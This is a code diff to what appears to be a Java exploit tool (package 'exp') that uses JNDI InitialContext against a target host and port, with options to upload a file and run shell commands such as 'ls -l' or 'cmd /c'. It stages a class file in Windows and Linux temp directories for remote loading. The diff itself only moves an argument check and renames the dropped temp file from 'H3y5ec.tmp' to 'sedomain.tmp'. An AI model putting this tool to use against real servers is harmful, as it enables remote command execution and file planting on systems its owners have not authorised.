@@ -1,4 +1,4 @@
-package org.heysec.exp;
+package org.secdomain.exp;
 
 import javax.naming.InitialContext;
 import java.io.File;
@@ -60,9 +60,7 @@ public class Main {
         System.out.println("Usage:\n\tjava -jar xxx.jar -h [host] -p [port] {options -f \"uploadfile.txt\" -c \"ls -l\"}\n\tWindows use commandline need \"cmd /c\" \n");
     }
     private static void usage(String[] args) {
-        if(args.length == 0 || args.length < 2){
-            helper();
-        }
+
         for (int i=0;i<args.length;i++) {
             //host arg
             if (args[i].compareToIgnoreCase("-h") ==  0) {
@@ -88,12 +86,15 @@ public class Main {
     }
     public static void main(String[] args) {
 	// write your code here
+        if(args.length == 0 || args.length < 2){
+            helper();
+            return ;
+        }
 
-
-        String remoteWindowsPath = "/c:/windows/temp/H3y5ec.tmp";
-        String remoteLinuxPath = "/tmp/H3y5ec.tmp";
-        String remoteWindowsClassPath = "file:/c:/windows/temp/H3y5ec.tmp";
-        String remoteLinuxClassPath = "file:/tmp/H3y5ec.tmp";
+        String remoteWindowsPath = "/c:/windows/temp/sedomain.tmp";
+        String remoteLinuxPath = "/tmp/sedomain.tmp";
+        String remoteWindowsClassPath = "file:/c:/windows/temp/sedomain.tmp";
+        String remoteLinuxClassPath = "file:/tmp/sedomain.tmp";
         String rst = "error";
 
         try {
